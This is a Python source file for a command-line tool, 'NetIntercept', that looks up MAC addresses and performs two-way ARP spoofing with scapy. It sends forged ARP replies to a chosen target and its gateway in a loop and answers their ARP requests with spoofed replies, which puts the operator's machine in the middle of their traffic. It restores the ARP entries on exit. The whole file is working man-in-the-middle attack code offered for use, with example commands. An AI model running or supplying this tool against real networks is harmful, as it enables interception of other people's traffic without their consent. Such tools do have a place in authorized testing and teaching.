#!/usr/bin/python3
# trunk-ignore-all(isort)
import argparse
import scapy.all as scapy
import netifaces  # Import netifaces to get default gateway
import threading
import time  # Import the time module

# trunk-ignore(ruff/F401)
from scapy.all import ARP


class TextColors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    # New colors
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    LIGHT_YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_MAGENTA = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"


class NetIntercept:
    """
    A class for performing network interception and manipulation, starting with ARP spoofing.
    """

    def __init__(self):
        """Initializes the NetIntercept object."""
        self.targ = None  # IP address or hostname of the target
        self.gateway_ip = None  # IP address of the default gateway
        self.interface = None  # Network interface to use
        self._get_default_interface()  # Get the default interface on initialization
        self.stop_event = threading.Event()  # Event to signal thread termination

    def _get_default_interface(self):
        """
        Determines the default network interface (the one used to reach the internet).
        """
        try:
            gws = netifaces.gateways()
            self.interface = gws["default"][netifaces.AF_INET][1]
            self.gateway_ip = gws["default"][netifaces.AF_INET][0]
            print(
                f"{TextColors.OKGREEN}Using default interface: {self.interface}, Gateway IP: {self.gateway_ip}{TextColors.ENDC}"
            )
        except Exception as e:
            self.print_error(f"Error getting default interface: {e}")
            self.interface = None  # Set to None if an error occurs
            self.gateway_ip = None

    def get_mac(self, ip_address: str, interface: str = None) -> str:
        """
        Retrieves the MAC address associated with a given IP address or hostname.

        Args:
            ip_address: The IP address of the target device.
            interface: The network interface to use (optional).
                        If None, the default interface will be used.

        Returns:
            str: The MAC address of the target device if found, otherwise "N/A".
        """
        try:
            if ip_address == self.get_ip_address(
                interface
            ):  # Check if it's the script's own IP
                # Get MAC address directly from the interface
                if interface is None:
                    interface = self.interface
                if interface:
                    return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0][
                        "addr"
                    ]
                else:
                    self.print_error("No valid network interface specified.")
                    return "N/A"

            else:
                # For other IPs, use ARP requests
                arp_request = scapy.ARP(pdst=ip_address)
                if interface is None:
                    interface = (
                        self.interface
                    )  # Use the default interface if not provided

                if interface:
                    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                    arp_request_broadcast = broadcast / arp_request
                    answered_list = scapy.srp(
                        arp_request_broadcast,
                        timeout=1,
                        verbose=False,
                        iface=interface,
                    )[0]

                    if answered_list:
                        return answered_list[0][1].hwsrc
                    else:
                        return "N/A"
                else:
                    self.print_error("No valid network interface specified.")
                    return "N/A"

        except Exception as e:
            print(f"{TextColors.FAIL}Error getting MAC address: {e}{TextColors.ENDC}")
            return "N/A"

    def get_ip_address(self, interface: str = None) -> str:
        """
        Gets the IP address associated with a given interface.

        Args:
            interface: The network interface to use (optional).
                        If None, the default interface will be used.

        Returns:
            str: The IP address of the interface if found, otherwise "N/A".
        """
        if interface is None:
            interface = self.interface
        if interface:
            try:
                return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["addr"]
            except (ValueError, KeyError):
                self.print_error(f"Failed to get IP address for interface {interface}")
                return "N/A"
        else:
            self.print_error("No valid network interface specified.")
            return "N/A"

    def spoof_arp(
        self, target_ip: str, spoof_ip: str, target_mac: str, interface: str = None
    ):
        """Sends an ARP spoofing packet."""
        try:
            if interface is None:
                interface = self.interface  # Use the default interface if not provided

            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False, iface=interface)  # Specify interface
        except Exception as e:
            self.print_error(f"Error sending spoofed ARP packet: {e}")

    def restore_arp(
        self,
        target_ip: str,
        gateway_ip: str,
        target_mac: str,
        gateway_mac: str,
        interface: str = None,
    ):
        """Restores the ARP table entry for the target."""
        try:
            if interface is None:
                interface = self.interface  # Use the default interface if not provided

            packet = scapy.ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=gateway_ip,
                hwsrc=gateway_mac,
            )
            scapy.send(
                packet, count=4, verbose=False, iface=interface
            )  # Specify interface
        except Exception as e:
            self.print_error(f"Error restoring ARP entry: {e}")

    def _arp_spoofing_thread(self, target_ip: str, gateway_ip: str):
        """Continuously performs ARP spoofing and handles ARP responses."""
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)

        if target_mac == "N/A" or gateway_mac == "N/A":
            self.print_error("Failed to retrieve MAC addresses. Exiting.")
            return

        self.print_status(
            f"Spoofing ARP for {target_ip} ({target_mac}) to use gateway {gateway_ip} ({gateway_mac})"
        )

        # Create a Scapy sniff filter
        filter_expression = (
            f"arp and ((ether src {target_mac}) or (ether src {gateway_mac}))"
        )

        try:
            # Start sniffing for ARP requests in a separate thread
            sniff_thread = threading.Thread(
                target=scapy.sniff,
                kwargs={
                    "store": False,
                    "prn": self._process_arp_packet,
                    "filter": filter_expression,
                    "iface": self.interface,
                    "stop_filter": lambda x: self.stop_event.is_set(),
                },
                daemon=True,
            )
            sniff_thread.start()

            # Main spoofing loop (send initial spoofed packets)
            while not self.stop_event.is_set():
                self.spoof_arp(target_ip, gateway_ip, target_mac)
                self.spoof_arp(gateway_ip, target_ip, gateway_mac)
                time.sleep(2)

        except Exception as e:
            self.print_error(f"Error in ARP spoofing thread: {e}")

        finally:
            # Restore ARP entries and stop sniffing
            self.restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)
            self.restore_arp(gateway_ip, target_ip, gateway_mac, target_mac)
            self.print_status(f"ARP spoofing stopped for {target_ip}")

    def _process_arp_packet(self, packet):
        """Processes sniffed ARP packets and sends spoofed responses."""
        if packet[scapy.ARP].op == 1:  # ARP request
            if packet[scapy.ARP].psrc == self.target_ip:
                # Target is asking for gateway MAC
                self.spoof_arp(self.target_ip, self.gateway_ip, packet[scapy.ARP].hwsrc)
                print(
                    f"{TextColors.LIGHT_GREEN}[+] Spoofed ARP Reply to Target: {self.target_ip} - MAC: {packet[scapy.ARP].hwsrc} is at {self.gateway_ip}{TextColors.ENDC}"
                )
            elif packet[scapy.ARP].psrc == self.gateway_ip:
                # Gateway is asking for target MAC
                self.spoof_arp(self.gateway_ip, self.target_ip, packet[scapy.ARP].hwsrc)
                print(
                    f"{TextColors.LIGHT_BLUE}[+] Spoofed ARP Reply to Gateway: {self.gateway_ip} - MAC: {packet[scapy.ARP].hwsrc} is at {self.target_ip}{TextColors.ENDC}"
                )

    def _parse_arguments(self):
        """
        Parses command-line arguments using argparse.
        """
        parser = argparse.ArgumentParser(
            description="A network interception tool for ARP spoofing and more.",
            epilog="Example: python netintercept.py --getmac 192.168.1.10",
            formatter_class=argparse.RawTextHelpFormatter,  # For better formatting of examples
        )

        # Argument for getting the MAC address
        parser.add_argument(
            "--getmac",
            metavar="TARGET_IP",
            help="""Get the MAC address of a device on the network.
            \nExample:
                python netintercept.py --getmac 192.168.1.10
                python netintercept.py --getmac 192.168.1.100 -i eth0""",
        )

        # Argument for ARP spoofing
        parser.add_argument(
            "--spoof",
            metavar=("TARGET_IP", "GATEWAY_IP"),
            nargs=2,
            help="""Perform ARP spoofing.
            \nExample:
                python netintercept.py --spoof 192.168.1.10 192.168.1.1""",
        )

        # Make -i/--interface a global option (not tied to any specific command)
        parser.add_argument(
            "-i",
            "--interface",
            help="Network interface to use (optional). If not provided, the default interface will be used.",
        )

        args = parser.parse_args()

        # Assign parsed arguments to class attributes
        self.targ = args.getmac
        self.target_ip, self.gateway_ip = args.spoof if args.spoof else (None, None)

    def run(self):
        """
        Main execution method for the NetIntercept class.
        """
        self._parse_arguments()

        if self.targ:
            mac_address = self.get_mac(self.targ)
            print(
                f"{TextColors.OKGREEN}MAC address for {self.targ}: {mac_address}{TextColors.ENDC}"
            )

        elif self.target_ip and self.gateway_ip:
            try:
                # Start the ARP spoofing thread
                spoof_thread = threading.Thread(
                    target=self._arp_spoofing_thread,
                    args=(self.target_ip, self.gateway_ip),
                    daemon=True,
                )
                spoof_thread.start()

                # Keep the main thread running to handle KeyboardInterrupts
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.print_status("Stopping ARP spoofing...")
                self.stop_event.set()  # Signal the thread to stop
                spoof_thread.join()  # Wait for the thread to finish
                self.print_status("ARP spoofing stopped.")
        else:
            self.print_error("Please specify either --getmac or --spoof option.")

    def print_status(self, message):
        """Print status messages to the console."""
        print(f"{TextColors.OKGREEN}[+] {message}{TextColors.ENDC}")

    def print_error(self, message):
        """Print error messages to the console."""
        print(f"{TextColors.FAIL}[!] {message}{TextColors.ENDC}")


if __name__ == "__main__":
    net_intercept = NetIntercept()
    net_intercept.run()
